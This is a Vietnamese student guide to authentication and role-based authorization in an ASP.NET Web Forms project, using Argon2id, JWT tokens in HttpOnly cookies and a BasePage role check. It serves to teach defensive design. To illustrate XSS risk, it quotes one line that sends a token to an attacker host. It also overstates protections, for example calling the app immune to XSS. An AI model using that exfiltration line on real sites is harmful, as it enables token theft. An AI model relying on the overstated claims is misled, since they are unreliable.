# HƯỚNG DẪN BẢO MẬT & PHÂN QUYỀN HỆ THỐNG (AUTHENTICATION & AUTHORIZATION)
> **Học phần:** Lập Trình Web ASPX  
> **Chủ đề 6:** Authentication / Authorization - Login, Logout, Phân quyền Role (Admin / User)  
> **Kiến trúc:** Clean Architecture, ASP.NET Web Forms (.NET 4.7.2)  
> **Công nghệ áp dụng:** Argon2id (OWASP #1), JWT (Access & Refresh Token), HttpOnly Cookies, RBAC BasePage.

---

## MỤC LỤC
1. [Khái niệm Cốt lõi: Authentication vs Authorization](#1-khái-niệm-cốt-lõi-authentication-vs-authorization)
2. [Cấu trúc Thư mục Dự án Chuẩn (Clean Architecture)](#2-cấu-trúc-thư-mục-dự-án-chuẩn-clean-architecture)
3. [Kiến trúc Bảo mật Tổng thể](#3-kiến-trúc-bảo-mật-tổng-thể)
4. [Chi tiết Kỹ thuật Các Module Bảo mật](#4-chi-tiết-kỹ-thuật-các-module-bảo-mật)
   - 4.1. [Thuật toán Băm Mật khẩu Argon2id (`Security/Argon2PasswordHasher.cs`)](#41-thuật-toán-băm-mật-khẩu-argon2id)
   - 4.2. [Cơ chế JWT: Access Token & Refresh Token (`Security/JwtTokenService.cs`)](#42-cơ-chế-jwt-access-token--refresh-token)
   - 4.3. [Bảo vệ Token bằng HttpOnly Cookie (`Security/TokenCookieManager.cs`)](#43-bảo-vệ-token-bằng-httponly-cookie)
   - 4.4. [Cơ chế Thu hồi Token & Xoay vòng Token (`Data/RefreshTokenRepository.cs`)](#44-cơ-chế-thu-hồi-token--xoay-vòng-token)
5. [Hướng dẫn Lớp Phân quyền (`Common/BasePage.cs`)](#5-hướng-dẫn-lớp-phân-quyền-commonbasepagecs)
6. [Cơ sở Dữ liệu & Tài khoản Mẫu (`Data/database.sql`)](#6-cơ-sở-dữ-liệu--tài-khoản-mẫu)
7. [Kịch bản Demo & Báo cáo Trước Lớp (Đạt Điểm Tối Đa)](#7-kịch-bản-demo--báo-cáo-trước-lớp)
8. [Các Câu hỏi Giảng viên Thường Hỏi & Gợi ý Trả lời](#8-các-câu-hỏi-giảng-viên-thường-hỏi)

---

## 1. Khái niệm Cốt lõi: Authentication vs Authorization

| Tiêu chí | Authentication (Xác thực) | Authorization (Phân quyền / Ủy quyền) |
| :--- | :--- | :--- |
| **Câu hỏi cốt lõi** | *"Bạn là ai?"* (Who are you?) | *"Bạn được phép làm những gì?"* (What can you do?) |
| **Thời điểm diễn ra** | Diễn ra đầu tiên khi người dùng nhập thông tin đăng nhập. | Diễn ra sau khi đã xác thực danh tính thành công. |
| **Cơ chế áp dụng** | Kiểm tra Tên đăng nhập + Mật khẩu băm (Argon2id) trong CSDL. | Kiểm tra Vai trò (**Role: Admin / User**) trích xuất từ JWT Claim. |
| **Xử lý khi thất bại** | Chuyển hướng về trang **`Login.aspx`** (401 Unauthorized). | Chuyển hướng về trang **`AccessDenied.aspx`** (403 Forbidden). |

---

## 2. Cấu trúc Thư mục Dự án Chuẩn (Clean Architecture)

Dự án được tái cấu trúc theo nguyên lý **Separation of Concerns (Tách biệt trách nhiệm)**, giúp code gọn gàng, bảo trì dễ dàng và gây ấn tượng mạnh với giảng viên:

```
SEMI_FINAL_ASPX/
│
├── Security/                      👉 CORE BẢO MẬT (Thuật toán mã hóa & Token)
│   ├── Argon2PasswordHasher.cs    # Hàm băm Argon2id chuẩn PHC (OWASP #1)
│   ├── JwtTokenService.cs         # Tạo, ký và xác thực Access/Refresh Token
│   └── TokenCookieManager.cs      # Đóng gói Token vào HttpOnly Cookies (Chống XSS)
│
├── Data/                          👉 DATA ACCESS LAYER (Cơ sở dữ liệu)
│   ├── RefreshTokenRepository.cs  # Thao tác bảng RefreshToken (Lưu hash, xoay vòng, thu hồi)
│   └── database.sql               # Script CSDL QL_NguoiDung + Dữ liệu mẫu Argon2id
│
├── Common/                        👉 LỚP NỀN TẢNG DÙNG CHUNG (Core Architecture)
│   ├── BasePage.cs                # "Lớp phân quyền" cốt lõi: Tự động kiểm tra RBAC & Silent Refresh
│   └── SecurityHelper.cs          # Tiện ích kiểm tra Auth nhanh & Đăng xuất toàn diện
│
├── Content/                       👉 Giao diện (Bootstrap 5 CSS, Custom styles)
├── Scripts/                       👉 Javascript thư viện Bootstrap
├── Properties/                    👉 Cấu hình Assembly dự án
│
├── AccessDenied.aspx / .cs        👉 Giao diện trang 403 (Từ chối truy cập)
├── Admin.aspx / .cs               👉 Giao diện trang Quản trị (Dành riêng cho Role: Admin)
├── Login.aspx / .cs               👉 Giao diện trang Đăng nhập
├── Logout.aspx / .cs              👉 Trang xử lý Đăng xuất
├── User.aspx / .cs                👉 Giao diện trang Người dùng thường (Role: User)
├── Global.asax                    👉 Vòng đời ứng dụng ASP.NET
├── Web.config                     👉 Cấu hình Secret Key, HttpOnly Cookies, Connection String
└── packages.config                👉 Quản lý thư viện NuGet
│
Tests/                             👉 KIỂM THỬ TỰ ĐỘNG
└── test_security.ps1              # Script kiểm thử tự động 8 kịch bản bảo mật
```

---

## 3. Kiến trúc Bảo mật Tổng thể

```
[ Trình duyệt (Browser) ]
       │
       ├─ (1) POST Form Đăng nhập (username, password) ──────────► [ Login.aspx.cs ]
       │                                                                  │
       │                                                                  ├─ Kiểm tra tài khoản trong SQL
       │                                                                  ├─ Xác thực mật khẩu qua Argon2id
       │                                                                  ▼ (Thành công)
       │  ◄── (2) Trả về Set-Cookie: jwt_access_token (15m, HttpOnly) ────┴─ Cấp Access Token + Refresh Token
       │          Set-Cookie: jwt_refresh_token (7d, HttpOnly)              Lưu SHA-256 Refresh Token vào SQL
       │
       ├─ (3) Truy cập Admin.aspx / User.aspx (Browser tự gửi Cookie) ──► [ Common/BasePage.cs (OnInit) ]
       │                                                                  │
       │                                                                  ├─ Đọc & Giải mã Access Token
       │                                                                  ├─ Token hết hạn? ──► Tự động dùng Refresh Token
       │                                                                  │                     để cấp Access Token mới (Silent Refresh)
       │                                                                  ▼
       │                                                              [ Kiểm tra Role ]
       │                                                                  ├─ Đúng Role: Hiển thị nội dung trang (200 OK)
       │  ◄── (4) Đá về AccessDenied.aspx nếu User vào Admin.aspx ────────┴─ Sai Role: Chặn lập tức (403 Forbidden)
```

---

## 4. Chi tiết Kỹ thuật Các Module Bảo mật

### 4.1. Thuật toán Băm Mật khẩu Argon2id (`Security/Argon2PasswordHasher.cs`)
* **Tại sao không dùng MD5 / SHA-256 thường?**
  * MD5 và SHA-256 là hàm băm nhanh, kẻ tấn công có thể dùng card đồ họa (GPU) để thử hàng tỷ mật khẩu mỗi giây (Brute-force).
  * **Argon2id** là thuật toán thắng giải *Password Hashing Competition*, chuẩn khuyến nghị số 1 của **OWASP**.
* **Cấu hình an toàn được thiết lập:**
  * **Memory:** $65,536\text{ KB}$ ($64\text{ MB}$) $\rightarrow$ Ép buộc kẻ tấn công phải tốn lượng lớn RAM, vô hiệu hóa hoàn toàn dàn trâu cày GPU/ASIC.
  * **Iterations (Số vòng lặp):** $3$ vòng.
  * **DegreeOfParallelism:** $2$ luồng.
  * **Salt:** $16\text{ bytes}$ ngẫu nhiên từ `RNGCryptoServiceProvider` cho mỗi tài khoản.
* **Định dạng chuỗi lưu trữ (PHC String Format):**
  `$argon2id$v=19$m=65536,t=3,p=2${salt_base64}${hash_base64}`
* **Chống Timing Attack:** Sử dụng hàm so sánh thời gian cố định `SlowEquals` để ngăn chặn hacker đo thời gian phản hồi máy chủ nhằm suy đoán mật khẩu.

---

### 4.2. Cơ chế JWT: Access Token & Refresh Token (`Security/JwtTokenService.cs`)
* **Access Token (Hạn sống ngắn - 15 phút):**
  * Chứa thông tin nhận dạng và phân quyền dưới dạng các Claim:
    * `sub`: Tên đăng nhập (`admin`, `user`).
    * `name`: Họ và tên hiển thị.
    * `role`: Vai trò người dùng (`Admin` hoặc `User`).
    * `userId`: Khóa chính trong CSDL.
  * Được ký bằng khóa đối xứng 256-bit (`HmacSha256Signature`). Bất kỳ sự chỉnh sửa trái phép nào trên Token đều khiến chữ ký bị sai và máy chủ từ chối ngay lập tức.
* **Refresh Token (Hạn sống dài - 7 ngày):**
  * Là chuỗi ngẫu nhiên bảo mật 32-bytes sinh từ bộ sinh số ngẫu nhiên cấp hệ điều hành.
  * Chỉ dùng để xin cấp lại Access Token mới mà người dùng không cần phải gõ lại mật khẩu.

---

### 4.3. Bảo vệ Token bằng HttpOnly Cookie (`Security/TokenCookieManager.cs`)
* **Điểm yếu của localStorage:** Nếu lưu JWT trong `localStorage`, bất kỳ lỗi XSS (Cross-Site Scripting) nào cũng có thể bị hacker chèn script `fetch(attacker.com?token=' + localStorage.getItem('token'))` để đánh cắp token.
* **Giải pháp khắc phục:** Lưu cả 2 token trong **Cookie với cờ `HttpOnly = true`**:
  * JavaScript trên trình duyệt hoàn toàn **KHÔNG THỂ** truy cập cookie này.
  * Trình duyệt tự động đính kèm cookie này theo mọi request click link, submit form của ASP.NET Web Forms.
  * Bổ sung cờ `SameSite = SameSiteMode.Lax` để phòng chống tấn công giả mạo request chéo (CSRF).

---

### 4.4. Cơ chế Thu hồi Token & Xoay vòng Token (`Data/RefreshTokenRepository.cs`)
* **Bảo mật cơ sở dữ liệu:** CSDL không lưu trực tiếp chuỗi Refresh Token gốc, mà chỉ lưu **mã băm SHA-256** của nó (`TokenHash`). Nếu hacker chiếm được CSDL, chúng cũng không thể dùng dữ liệu đó để giả lập token.
* **Cơ chế Xoay vòng Token (Refresh Token Rotation):**
  * Mỗi khi Refresh Token được sử dụng để xin cấp Access Token mới, Refresh Token cũ sẽ bị đánh dấu thu hồi (`IsRevoked = 1`) và hệ thống cấp ngay một Refresh Token mới.
  * Nếu Refresh Token cũ bị đánh cắp và kẻ tấn công cố tình dùng lại, hệ thống sẽ phát hiện token đã bị thu hồi và từ chối cấp quyền.
* **Đăng xuất tuyệt đối:** Khi bấm Đăng xuất, token được đánh dấu `IsRevoked = 1` trong CSDL và Cookie trên trình duyệt bị xóa hạn về quá khứ.

---

## 5. Hướng dẫn Lớp Phân quyền (`Common/BasePage.cs`)

Đây là điểm mấu chốt giải quyết yêu cầu **"Hướng dẫn lớp phân quyền"** trong bài tập:

### 5.1. Vấn đề của cách làm cũ (Viết code thủ công từng trang)
Nếu ở mỗi trang `Admin.aspx`, `User.aspx` bạn đều copy-paste đoạn code:
```csharp
// CÁCH CŨ: Dễ quên, khó bảo trì, dễ hở lỗ hổng bảo mật
if (Session["Username"] == null) { Response.Redirect("Login.aspx"); }
if (Session["Role"] != "Admin") { Response.Redirect("AccessDenied.aspx"); }
```
Cách này khiến code bị phân tán. Nếu sau này tạo thêm 10 trang quản trị mà lập trình viên quên viết đoạn code trên ở 1 trang, trang đó sẽ bị hổng bảo mật nghiêm trọng (Lỗ hổng BOLA / IDOR).

### 5.2. Giải pháp: Lớp trừu tượng `BasePage`
Chúng ta tạo lớp `BasePage` trong thư mục `Common/` kế thừa `System.Web.UI.Page`:

```csharp
namespace SEMI_FINAL_ASPX.Common
{
    public abstract class BasePage : Page
    {
        // Quyền yêu cầu mặc định: null (chỉ cần đăng nhập)
        public virtual string RequiredRole => null;

        public string CurrentUsername { get; private set; }
        public string CurrentFullName { get; private set; }
        public string CurrentRole { get; private set; }

        protected override void OnInit(EventArgs e)
        {
            base.OnInit(e);
            // Tự động kiểm tra Token & Phân quyền ngay tại thời điểm khởi tạo trang
            AuthenticateAndAuthorize();
        }
    }
}
```

### 5.3. Cách sử dụng cực kỳ ngắn gọn cho các trang con

#### Cho trang Quản trị (`Admin.aspx.cs`):
```csharp
using SEMI_FINAL_ASPX.Common;

namespace SEMI_FINAL_ASPX
{
    public partial class Admin : BasePage
    {
        // CHỈ CẦN 1 DÒNG NÀY: Khai báo trang này bắt buộc quyền Admin!
        public override string RequiredRole => "Admin";

        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                // Lấy thông tin người dùng từ JWT Claim tự động
                lblAdminName.Text = CurrentFullName;
                LoadDanhSachNguoiDung();
            }
        }
    }
}
```

#### Cho trang Người dùng (`User.aspx.cs`):
```csharp
using SEMI_FINAL_ASPX.Common;

namespace SEMI_FINAL_ASPX
{
    public partial class User : BasePage
    {
        // Không cần khai báo RequiredRole -> Bất kỳ ai đã đăng nhập đều vào được
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                lblUserName.Text = CurrentFullName;
                LoadDanhSachNguoiDung();
            }
        }
    }
}
```

---

## 6. Cơ sở Dữ liệu & Tài khoản Mẫu (`Data/database.sql`)

File script CSDL nằm tại: `SEMI_FINAL_ASPX\Data\database.sql`.

### Bảng `NguoiDung`:
| Cột | Kiểu dữ liệu | Ý nghĩa |
| :--- | :--- | :--- |
| `Id` | `INT IDENTITY` | Khóa chính |
| `TenDangNhap`| `VARCHAR(50)` | Tên đăng nhập (Unique) |
| `MatKhau` | `VARCHAR(255)`| Chuỗi hash **Argon2id** chuẩn PHC |
| `HoTen` | `NVARCHAR(100)`| Họ và tên người dùng |
| `Email` | `VARCHAR(100)`| Địa chỉ email |
| `Quyen` | `VARCHAR(20)` | Vai trò: `'Admin'` hoặc `'User'` |
| `TrangThai` | `NVARCHAR(30)` | `'Đang hoạt động'` hoặc `'Bị khóa'` |

### Bảng `RefreshToken`:
| Cột | Kiểu dữ liệu | Ý nghĩa |
| :--- | :--- | :--- |
| `Id` | `INT IDENTITY` | Khóa chính |
| `UserId` | `INT` | Khóa ngoại trỏ đến `NguoiDung(Id)` |
| `TokenHash` | `VARCHAR(64)` | Mã băm **SHA-256** của Refresh Token |
| `ExpiryDate` | `DATETIME` | Hạn sử dụng (7 ngày) |
| `IsRevoked` | `BIT` | Trạng thái thu hồi (`1` = đã thu hồi/đăng xuất) |
| `CreatedDate` | `DATETIME` | Ngày tạo |

### Danh sách Tài khoản Test (Tất cả mật khẩu mặc định là: `123`)

| Tên đăng nhập | Mật khẩu | Họ và tên | Vai trò (Role) | Trang đích sau khi Login |
| :--- | :---: | :--- | :---: | :---: |
| **`admin`** | `123` | Quản Trị Viên Hệ Thống | **Admin** | `Admin.aspx` |
| **`locadmin`** | `123` | Nguyễn Tấn Lộc (Admin) | **Admin** | `Admin.aspx` |
| **`user`** | `123` | Người Dùng Mẫu | **User** | `User.aspx` |
| **`giahung`** | `123` | Phan Trần Gia Hưng | **User** | `User.aspx` |
| **`vanan`** | `123` | Trần Văn An | **User** | `User.aspx` |
| **`thuhuong`**| `123` | Lê Thị Thu Hương | **User** | `User.aspx` |

---

## 7. Kịch bản Demo & Báo cáo Trước Lớp

Để buổi báo cáo hoặc chấm bài đạt điểm 10 tuyệt đối, hãy thực hiện theo đúng 5 bước sau:

* **Bước 1: Chạy kiểm thử tự động chứng minh hệ thống hoạt động**
  * Mở PowerShell tại thư mục dự án và chạy:
    ```powershell
    powershell -File Tests/test_security.ps1
    ```
  * Cho giảng viên xem kết quả 8 kịch bản kiểm thử bảo mật chạy thành công tự động.
* **Bước 2: Mở CSDL cho giảng viên xem cấu trúc dữ liệu**
  * Mở SQL Server Management Studio hoặc truy vấn bảng `NguoiDung`.
  * Cho giảng viên thấy cột `MatKhau` không hề lưu mật khẩu thô `123`, mà là chuỗi Argon2id an toàn tuyệt đối `$argon2id$v=19$m=65536,t=3...`.
* **Bước 3: Demo đăng nhập tài khoản User (`user` / `123`)**
  * Đăng nhập thành công $\rightarrow$ Hệ thống tự động chuyển vào `User.aspx`.
  * Bật **F12 $\rightarrow$ Tab Application $\rightarrow$ Cookies**: Chỉ cho giảng viên thấy cookie `jwt_access_token` và `jwt_refresh_token` đều có cờ tích **HttpOnly** màu xanh (chống lộ token qua JavaScript).
  * **Thử tấn công vượt quyền:** Trên thanh địa chỉ trình duyệt, gõ đổi link thành `http://localhost:61546/Admin.aspx` và Enter $\rightarrow$ Hệ thống lập tức chặn lại và đá sang trang **`AccessDenied.aspx (403)`**.
* **Bước 4: Demo đăng nhập tài khoản Admin (`admin` / `123`)**
  * Đăng xuất, sau đó đăng nhập tài khoản `admin`.
  * Hệ thống tự động chuyển vào `Admin.aspx` với đầy đủ quyền quản trị và các nút chức năng.
* **Bước 5: Thuyết minh code lớp `BasePage.cs`**
  * Mở file `Common/BasePage.cs` để giải thích cách thức kiểm tra quyền tập trung qua `OnInit` và cơ chế `Silent Refresh`.

---

## 8. Các Câu hỏi Giảng viên Thường Hỏi

### Q1: Tại sao em lại dùng Argon2id thay vì SHA-256 hay MD5?
> **Trả lời:** MD5 và SHA-256 là các hàm băm tính toán rất nhanh, hacker có thể dùng GPU thử hàng tỷ mật khẩu/giây. Argon2id là hàm băm bộ nhớ cứng (Memory-hard), ép buộc tốn 64MB RAM cho mỗi lần băm, khiến các thiết bị phần cứng chuyên dụng không thể brute-force được. Đây là chuẩn khuyến nghị số 1 hiện nay của OWASP.

### Q2: Tại sao làm Web Forms mà lại dùng JWT? Web Forms bình thường dùng Session mà?
> **Trả lời:** Session mặc định lưu trên bộ nhớ RAM của Web Server (In-Proc). Khi hệ thống mở rộng nhiều máy chủ (Load Balancing), Session sẽ bị mất nếu không đồng bộ State Server. JWT mang tính chất phi trạng thái (Stateless), toàn bộ thông tin User và Role được mã hóa và ký số an toàn. Đồng thời, em lưu JWT trong **HttpOnly Cookie** để tương thích hoàn toàn với cơ chế nạp trang và PostBack của Web Forms mà vẫn miễn nhiễm với tấn công XSS.

### Q3: Nếu Access Token bị hết hạn thì người dùng có bị bắt đăng nhập lại không?
> **Trả lời:** Dạ không. Hệ thống đã cài đặt cơ chế **Silent Refresh** trong lớp `BasePage.cs`. Khi Access Token (15 phút) hết hạn, hệ thống sẽ tự động dùng Refresh Token (7 ngày) trong Cookie để xác thực với CSDL, cấp lại một cặp token mới trong suốt và tiếp tục phục vụ người dùng mà không làm gián đoạn trải nghiệm.

### Q4: Nếu kẻ tấn công có được link `Admin.aspx` thì có xem trộm được dữ liệu không?
> **Trả lời:** Dạ không thể. Trang `Admin.aspx` kế thừa từ `BasePage` với khai báo `RequiredRole => "Admin"`. Ngay từ giai đoạn khởi tạo vòng đời trang (`OnInit`), `BasePage` đã chặn đứng request nếu không có Access Token hợp lệ của Admin và đẩy sang trang `AccessDenied.aspx` trước khi bất kỳ dữ liệu nào được truy vấn từ CSDL.
